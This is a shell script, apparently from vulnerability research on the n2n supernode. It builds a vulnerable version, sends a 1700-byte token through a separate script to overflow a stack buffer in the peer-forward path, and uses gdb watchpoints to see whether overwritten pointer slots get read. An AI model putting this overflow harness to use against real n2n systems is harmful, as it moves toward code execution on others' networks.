#!/bin/sh
# W10: W9 measured pointer-shaped spill slots inside the clang -O2 forward
# overflow window (sender +1552, rem +1592, cmn +1608, idx +1640 from &nak).
# Drive the peer-forward path with a 1700-byte token (writes to nak+1713)
# and watch those four slots for a genuine consumer READ after decode.
# Loopback only.
set -u
HERE=$(cd "$(dirname "$0")" || exit 1; pwd)
N2N=$(cd "$HERE/.." || exit 1; pwd)
TARBALL=$N2N/provision/n2n-vuln.tar.gz
COMMUNITY=$N2N/provision/build/n2n-plain/community.list
EVID=$HERE/evidence
WORK=${TMPDIR:-/tmp}/n2n2shell-w10.$$
PORT=${PORT:-18900}
mkdir -p "$WORK" || exit 1
trap 'rm -rf "$WORK"' EXIT HUP INT TERM

mkdir -p "$WORK/src" || exit 1
tar xzf "$TARBALL" -C "$WORK/src" || exit 1
SRC=$WORK/src/n2n-dc7324af16b2ff3e2b22961e7d8dffcb14f3f6ff
cp "$COMMUNITY" "$SRC/community.list" || exit 1
(cd "$SRC" && sh autogen.sh &&
    CC=clang CFLAGS="-g -O2 -fno-omit-frame-pointer" ./configure &&
    make -j4 supernode) >"$WORK/build.log" 2>&1 || { echo "BUILD FAIL"; exit 1; }

cat >"$WORK/gdb.txt" <<EOF
set pagination off
set confirm off
break sn_utils.c:2331
run -f -p 127.0.0.1:$PORT -t $((PORT+1)) -c community.list -F labfed -M
rwatch -l *(unsigned long *)((char *)&nak + 1552)
rwatch -l *(unsigned long *)((char *)&nak + 1592)
rwatch -l *(unsigned long *)((char *)&nak + 1608)
rwatch -l *(unsigned long *)((char *)&nak + 1640)
printf "W10_AFTER_DECODE\\n"
x/gx (char *)&nak + 1552
x/gx (char *)&nak + 1592
x/gx (char *)&nak + 1608
x/gx (char *)&nak + 1640
continue
printf "W10_WATCH_HIT\\n"
bt 12
info registers rip
kill
quit
EOF

(cd "$SRC" && timeout 45 gdb -q -batch -x "$WORK/gdb.txt" ./supernode) \
    >"$EVID/w10-clang-o2.log" 2>&1 &
GP=$!
sleep 5
python3 "$HERE/w10_large_peer.py" "$PORT" "$((PORT+10))" 1700 \
    >"$EVID/w10-clang-o2-sender.log" 2>&1
wait "$GP" 2>/dev/null || true
echo "=== sender ==="
cat "$EVID/w10-clang-o2-sender.log"
echo "=== decoded slots / watch result ==="
grep -A 12 'W10_AFTER_DECODE' "$EVID/w10-clang-o2.log" | head -20
if grep -q 'Old value =' "$EVID/w10-clang-o2.log"; then echo W10_RWATCH_HIT; elif grep -q 'Program received signal SIGSEGV' "$EVID/w10-clang-o2.log"; then echo W10_CRASHED_BEFORE_WATCH setting; else echo W10_NO_READ_IN_45S; fi
